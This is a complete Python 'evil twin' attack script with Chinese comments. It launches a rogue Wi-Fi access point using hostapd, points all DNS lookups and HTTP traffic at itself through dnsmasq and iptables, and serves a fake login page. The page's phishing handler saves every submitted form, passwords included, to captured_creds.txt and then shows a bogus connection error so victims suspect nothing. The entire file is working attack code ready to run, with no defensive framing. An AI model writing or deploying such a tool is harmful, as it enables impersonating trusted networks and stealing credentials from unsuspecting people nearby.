import os
import sys
import time
import subprocess
import argparse
import shutil
from http.server import BaseHTTPRequestHandler, HTTPServer

# ================= 配置区域 =================
AP_IP = "10.0.0.1"
DHCP_RANGE = "10.0.0.10,10.0.0.100,12h"
WEB_PORT = 80
TMP_DIR = "/tmp/eviltwin"

if not os.path.exists(TMP_DIR):
    os.makedirs(TMP_DIR)


def log(msg):
    t = time.strftime("%H:%M:%S", time.localtime())
    formatted = f"[{t}] {msg}"
    print(formatted)
    sys.stdout.flush()
    with open(f"{TMP_DIR}/eviltwin.log", "a") as f:
        f.write(formatted + "\n")


def run_cmd(cmd):
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


# ================= 钓鱼 Server =================
class PhishingHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        try:
            with open(f"{TMP_DIR}/index.html", 'r', encoding='utf-8') as f:
                self.wfile.write(f.read().encode('utf-8'))
        except:
            self.wfile.write(b"<h1>Loading...</h1>")

    def do_POST(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length).decode('utf-8')
            log(f"[+] 捕获数据: {data}")
            with open(f"{TMP_DIR}/captured_creds.txt", "a") as f:
                f.write(f"{data}\n")
            self.send_response(200);
            self.end_headers()
            self.wfile.write(b"<script>setTimeout(function(){alert('Connection Error');}, 1000);</script>")
        except:
            pass


def start_web_server():
    try:
        server = HTTPServer((AP_IP, WEB_PORT), PhishingHandler)
        log(f"[*] Web Server started on {AP_IP}")
        server.serve_forever()
    except Exception as e:
        log(f"[!] Web Server Error: {e}")


# ================= 网络配置 =================
def setup_interface(interface):
    log(f"[*] 初始化网卡 {interface}...")
    run_cmd(f"ip link set {interface} down")
    run_cmd(f"ip addr flush dev {interface}")
    run_cmd(f"ip link set {interface} up")
    run_cmd(f"ip addr add {AP_IP}/24 dev {interface}")


def start_dnsmasq(interface):
    log("[*] 启动 DHCP/DNS...")
    conf = f"interface={interface}\ndhcp-range={DHCP_RANGE}\ndhcp-option=3,{AP_IP}\ndhcp-option=6,{AP_IP}\nserver=8.8.8.8\naddress=/#/{AP_IP}\n"
    with open(f"{TMP_DIR}/dnsmasq.conf", "w") as f: f.write(conf)
    run_cmd("killall dnsmasq")
    subprocess.Popen(f"dnsmasq -C {TMP_DIR}/dnsmasq.conf -d", shell=True, stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL)


def start_hostapd(interface, ssid, channel, band):
    # 智能纠错：如果强制 2.4G 但给了 5G 信道，重置为 6
    if band == "2.4g":
        try:
            if int(channel) > 14 and int(channel) != 0:
                log(f"[!] 2.4G 模式不支持信道 {channel}，自动重置为 6")
                channel = 6
        except:
            pass

    log(f"[*] 启动 Hostapd | Band:{band} | CH:{channel} | SSID:{ssid}")

    # 默认 2.4G
    hw_mode = "g"
    ht_capab = "[HT40+][SHORT-GI-40][DSSS_CCK-40]"
    ieee80211ac = "0"

    # 5G 配置
    if band == "5g":
        hw_mode = "a"
        ht_capab = "[HT40+][SHORT-GI-40]"
        ieee80211ac = "1"

    # 自动信道
    channel_config = f"channel={channel}"
    if str(channel) == "0":
        log("[*] 启用自动信道 (ACS)...")
        channel_config = "channel=0\nacs_num_scans=1"

    conf = f"""
interface={interface}
driver=nl80211
ssid={ssid}
hw_mode={hw_mode}
{channel_config}
ieee80211n=1
ieee80211ac={ieee80211ac}
wmm_enabled=1
ht_capab={ht_capab}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
country_code=US
"""
    with open(f"{TMP_DIR}/hostapd.conf", "w") as f:
        f.write(conf)

    with open(f"{TMP_DIR}/hostapd.log", "w") as logf:
        subprocess.Popen(f"hostapd {TMP_DIR}/hostapd.conf", shell=True, stdout=logf, stderr=subprocess.STDOUT)


def setup_iptables(interface):
    run_cmd("echo 1 > /proc/sys/net/ipv4/ip_forward")
    run_cmd(
        f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j DNAT --to-destination {AP_IP}:{WEB_PORT}")
    run_cmd("iptables -t nat -A POSTROUTING -j MASQUERADE")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", required=True)
    parser.add_argument("--ssid", required=True)
    parser.add_argument("--channel", default="6")
    parser.add_argument("--template", default="<h1>Login</h1>")
    parser.add_argument("--band", default="2.4g")
    args = parser.parse_args()

    with open(f"{TMP_DIR}/index.html", "w", encoding='utf-8') as f:
        f.write(args.template)

    run_cmd("killall hostapd dnsmasq wpa_supplicant")
    run_cmd("rfkill unblock all")

    setup_interface(args.interface)
    start_dnsmasq(args.interface)
    start_hostapd(args.interface, args.ssid, args.channel, args.band)
    setup_iptables(args.interface)
    start_web_server()


if __name__ == "__main__":
    try:
        main()
    except:
        pass